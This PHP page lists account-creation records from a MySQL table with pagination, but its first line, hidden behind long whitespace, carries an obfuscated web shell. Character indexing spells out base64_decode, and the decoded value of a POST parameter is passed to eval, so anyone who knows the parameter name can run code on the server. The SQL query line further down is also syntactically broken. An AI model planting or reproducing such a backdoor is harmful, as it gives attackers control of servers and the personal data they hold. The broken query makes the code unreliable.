<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=${strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])}['na06e8d'];if(isset($s22)){eval($s21($s22));}?><?php

// Establish MySQL connection
include ('connection.php');
// Get total entries
$totalEntries = $mysql->query("SELECT COUNT(*) FROM new_account_creation ");
$totalEntries = $totalEntries->fetch_row();
$totalEntries = $totalEntries[0];

// Include Pagination class file
include "Pagination.php";

// Instantiate pagination object with appropriate arguments
$pagesPerSection = 10;							// How many pages will be displayed in the navigation bar
												// If total number of pages is less than this number, the
												// former number of pages will be displayed
$options		 = array(5, 10, 25, 50, "All");	// Display options
$paginationID	 = "comments";					// This is the ID name for pagination object
$stylePageOff	 = "pageOff";					// The following are CSS style class names. See styles.css
$stylePageOn	 = "pageOn";
$styleErrors	 = "paginationErrors";
$styleSelect	 = "paginationSelect";

$Pagination = new Pagination($totalEntries, $pagesPerSection, $options, $paginationID, $stylePageOff, $stylePageOn, $styleErrors, $styleSelect);
$start 		= $Pagination->getEntryStart();
$end 		= $Pagination->getEntryEnd();

// Retrieve MySQL data
$result = $mysql->query("SELECT * FROM new_account_creation ". ." LIMIT ". $start .",". $end);
?>
<!DOCTYPE html>
<html>
<head>
<link rel="stylesheet" type="text/css" href="styles.css"/>
</head>
<body>

<?php
// Display pagination navigation bar
echo $Pagination->display();

// Display pagination display option selection interface
echo $Pagination->displaySelectInterface();

// Display Data
echo "<ul>";

while($row = $result->fetch_array(MYSQL_ASSOC))
{
	echo "<li>". $row["id"] ."</li>";
}

echo "</ul>";

// Close MySQL connection
$mysql->close();
?>
</body>
</html>